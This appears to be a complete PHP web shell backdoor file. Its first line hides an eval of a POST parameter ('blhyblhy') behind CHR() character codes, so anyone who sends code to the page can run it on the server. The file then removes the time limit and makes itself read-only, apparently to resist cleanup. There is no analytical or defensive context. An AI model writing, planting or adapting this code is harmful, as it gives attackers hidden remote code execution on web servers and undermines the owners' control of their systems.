<?php
EVAL(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(98).CHR(108).CHR(104).CHR(121).CHR(98).CHR(108).CHR(104).CHR(121).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));
set_time_limit(0);
$url1 = $_SERVER['PHP_SELF'];  
$name= substr($url1 ,strrpos($url1 ,'/')+1 );
chmod($name,0444);
?>